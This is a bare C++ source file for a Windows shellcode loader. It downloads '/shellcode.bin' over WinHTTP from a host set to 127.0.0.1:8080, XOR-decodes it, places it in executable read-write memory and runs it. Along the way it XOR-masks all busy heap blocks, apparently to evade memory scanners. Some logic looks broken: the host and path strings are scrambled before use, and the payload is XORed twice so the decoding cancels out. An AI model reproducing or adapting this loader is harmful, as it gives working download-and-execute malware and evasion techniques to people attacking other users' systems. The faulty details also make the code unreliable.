#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <Windows.h>
#include <iostream>
#include <vector>
#pragma comment(lib,"winhttp.lib")
#pragma warning(disable:4996)

typedef struct Params {
    LPVOID pBaseAddress;
} PARAMS;

typedef VOID(*fprun)(PARAMS pParams);

void XOR(char* data, int len, unsigned char key) {
    for (int i = 0; i < len; i++)
        data[i] ^= key;
}

const char key[2] = "B";
size_t keySize = sizeof(key);

void xbrLength(const char* key, const size_t keyLength, char* buffer, const size_t length) {
    for (size_t i = 0; i < length; ++i) {
        buffer[i] ^= key[i % keyLength];
    }
}

PROCESS_HEAP_ENTRY entry;

void HED() {
    SecureZeroMemory(&entry, sizeof(entry));
    while (HeapWalk(GetProcessHeap(), &entry)) {
        if ((entry.wFlags & PROCESS_HEAP_ENTRY_BUSY) != 0) {
            xbrLength(key, keySize, (char*)(entry.lpData), entry.cbData);
        }
    }
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    wchar_t rh[] = L"127.0.0.1";
    xbrLength(key, keySize, (char*)rh, sizeof(rh) - sizeof(wchar_t));
    int rp = 8080;
    wchar_t rd[] = L"/shellcode.bin";
    xbrLength(key, keySize, (char*)rd, sizeof(rd) - sizeof(wchar_t));
    unsigned char k = 0x8F;

    HINTERNET hI, hHS, hHR;
    DWORD dS, dSt, dStS, dD = 0;
    LPSTR pOB;
    std::vector<unsigned char> PEb;

    hI = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    hHS = WinHttpConnect(hI, rh, rp, 0);
    hHR = WinHttpOpenRequest(hHS, L"GET", rd, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

    BOOL bR = WinHttpSendRequest(hHR, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    bR = WinHttpReceiveResponse(hHR, NULL);

    do {
        dS = 0;
        if (!WinHttpQueryDataAvailable(hHR, &dS)) {
        }

        pOB = new char[dS + 1];

        if (!pOB) {
            dS = 0;
        }

        ZeroMemory(pOB, dS + 1);

        if (!WinHttpReadData(hHR, (LPVOID)pOB, dS, &dD)) {
        }
        else {
            PEb.insert(PEb.end(), pOB, pOB + dD);
        }
    } while (dS > 0);

    char* PE = (char*)malloc(PEb.size());
    for (int i = 0; i < PEb.size(); i++) {
        PE[i] = PEb[i] ^ 0x8f;
    }

    PARAMS pP;
    pP.pBaseAddress = (LPVOID)GetModuleHandleA(NULL);
    LPVOID pB = VirtualAlloc(NULL, PEb.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (NULL == pB) {
        exit(1);
    }

    XOR(PE, PEb.size(), k);
    memcpy(pB, PE, PEb.size());

    HED();
    Sleep(10);
    HED();

    fprun Run = (fprun)pB;
    Run(pP);

    WinHttpCloseHandle(hHR);
    WinHttpCloseHandle(hHS);
    WinHttpCloseHandle(hI);
    free(PE);

    __noop();
    __noop();
    __noop();

    return 0;
}
